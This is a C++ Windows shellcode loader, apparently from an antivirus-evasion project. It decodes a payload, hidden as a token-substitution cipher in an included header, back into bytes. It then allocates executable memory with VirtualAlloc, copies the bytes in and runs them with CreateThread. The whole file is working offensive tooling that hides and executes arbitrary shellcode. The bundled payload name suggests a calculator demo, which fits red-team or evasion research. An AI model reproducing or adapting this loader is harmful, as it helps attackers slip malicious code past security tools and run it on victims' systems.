#include <windows.h>
#include <cstdio>
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <sstream>
#include <iomanip>
#include <cstdlib>
#include <bitset>
#ifdef SHELLCODE_PATH
#include SHELLCODE_PATH
#else
#include "../../src/shellcodes/natural_language_calc.hpp"
#endif


using namespace std;

vector<int> decrypt(string key[], string encrypted[], int lenEncrypted)
{
    map<string, int> dict;
    vector<int> decrypted;

    for (int i = 0; i < 256 ; i++)
    {
        dict[key[i]] = i;
    }

    for (int i = 0; i < lenEncrypted; i++)
    {
        decrypted.push_back(dict[encrypted[i]]);
        //cout << dict[encrypted[i]] << " ";
    }

    return decrypted;
}

int main()
{
    int lenEncrypted = sizeof(encrypted)/sizeof(string);

    vector<int> decrypted;
    unsigned char shellcode[LEN];
#if DEBUG
    printf("Start\n");
    printf("Hit enter to continue\n");
    getchar();
#endif
    decrypted = decrypt(key, encrypted, lenEncrypted);
#if DEBUG
    printf("Decrypted\n");
    printf("Hit enter to continue\n");
    getchar();
#endif

    std::stringstream ss;
    string result;
    for (int i = 0; i < lenEncrypted; i++)
    {
        //ss << "\\x" <<std::setfill('0') << std::setw(2) << std::hex << decrypted[i];
        ss <<std::setfill('0') << std::setw(2) << std::hex << decrypted[i] << " ";

    }
    result = ss.str();
#if DEBUG
    printf("Stringstream\n");
    printf("Hit enter to continue\n");
    getchar();
#endif
 //   cout << result << "\n";

    std::string hex_chars(result);

    std::istringstream hex_chars_stream(hex_chars);
    std::vector<unsigned char> shellcode3;

    unsigned int ch;
    while (hex_chars_stream >> std::hex >> ch)
    {
        shellcode3.push_back(ch);
    }

    int j = 0;
    for (auto i = shellcode3.begin(); i != shellcode3.end(); ++i){
        shellcode[j] = *i;
        //cout << *i << " ";
        j++;
    }


    for (int i = 0; i < lenEncrypted; i++){
        cout << shellcode[i];
    }



	// Step 1 : Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode),
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

#if DEBUG
	printf("Allocated memory at %p\n", memory);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 2 : Copy the shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode));

#if DEBUG
	printf("Shellcode copied to memory\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 3 : Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
